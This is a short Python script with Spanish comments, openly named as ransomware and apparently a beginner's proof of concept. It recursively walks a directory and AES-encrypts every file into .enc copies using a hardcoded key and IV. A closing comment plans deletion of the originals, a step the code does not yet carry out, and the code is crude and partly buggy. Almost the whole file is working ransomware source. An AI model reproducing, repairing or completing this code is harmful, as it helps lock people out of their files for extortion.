# -*- coding: UTF-8 -*-
from Crypto.Cipher import AES
import os

###################################
##Encriptamos el objeto           #
#ciphertext = obj.encrypt(message)#
###################################

def ransomware():
    """Creamos las variables necesarias"""
    baseUrl= '/home/rem/Escritorio/proof/'  #Desde donde comienza a escanear en busca de ficheros
    key = 'hola hola hola..' #os.urandom(16)                    #Key, de 16 bytes
    iv = 'hola hola hola..' #os.urandom(16)                     #Initial Value, de 16 bytes
    obj = AES.new(key, AES.MODE_CBC, iv)    #Creamos el cifrador
    chunk = 16


    """Busca recursivamente todos los ficheros"""
    for root, directories, filenames in os.walk(baseUrl):



        """Cada archivo dentro de esa lista de archivos"""
        for file in filenames:
            """Archivo de entrada y archivo de salida (mismo nombre pero con extensión '.enc')"""
            infile = os.path.join(root+file)
            outfile, ext = os.path.splitext(file)
            outfile = os.path.join(root+outfile+'.enc')
            filesize = os.path.getsize(infile)



            """Leemos el archivo de entrada y escribimos en el de salida"""
            read_in = open(infile,'r+')
            read_out = open(outfile,'w+')
            lineas_in = read_in.readlines()



            for linea_in in lineas_in:
                if len(linea_in) == chunk: #Si el tamaño es encriptable
                   ciphertext = obj.encrypt(linea_in)  #encripta esa linea automaticamente

                elif len(linea_in)<chunk: #Si el tamaño es menor
                   nulls = chunk - len(linea_in) #Calcula la diferencia entre 16 o el multiplo que queramos, y la longitud
                   linea_in += ' ' * nulls #Añade el numero de espacios necesarios hasta llegar a 16
                   ciphertext = obj.encrypt(linea_in)  #encripta esa linea

                elif len(linea_in)>chunk: #Si el tamaño es mayor
                   rest = len(linea_in)%chunk #Calcula el resto
                   nulls = chunk - rest #Calcula los nulos (chunk - resto)
                   linea_in += ' ' * nulls #Añade los espacios, hasta llegar a 16 o el multiplo que queramos, a la linea
                   ciphertext = obj.encrypt(linea_in)  #encripta esa linea


                read_out.write(ciphertext)   #La escribe en el fichero de salida



            """Cierra ambos ficheros, el de entrada y el de salida (Leí por ahí que sino puede corromper esos archivos)"""
            read_out.close()
            read_in.close()



    """ELIMINAR EL ARCHIVO QUE SOBRA ORIGINAL"""
    

ransomware()
